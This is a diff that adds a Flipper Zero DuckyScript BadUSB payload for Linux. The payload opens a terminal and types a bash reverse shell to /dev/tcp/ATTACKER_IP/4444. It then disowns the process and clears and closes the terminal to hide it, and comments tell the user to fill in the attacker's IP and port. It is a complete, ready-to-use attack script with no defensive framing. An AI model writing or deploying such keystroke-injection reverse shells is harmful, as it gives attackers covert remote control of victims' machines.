@@ -1,0 +1,19 @@
+﻿REM ============================================================================
+REM  FLLC - BadUSB: Linux Reverse Shell
+REM  Flipper Zero DuckyScript
+REM ============================================================================
+REM  Target: Linux (most distros)
+REM  Time: ~5 seconds
+REM  Opens terminal and spawns reverse shell
+REM  CHANGE ATTACKER_IP AND PORT BEFORE USE
+REM ============================================================================
+
+DELAY 1000
+REM Open terminal (try multiple shortcuts)
+CTRL-ALT t
+DELAY 1500
+STRING bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &
+ENTER
+DELAY 300
+STRING disown && clear && exit
+ENTER
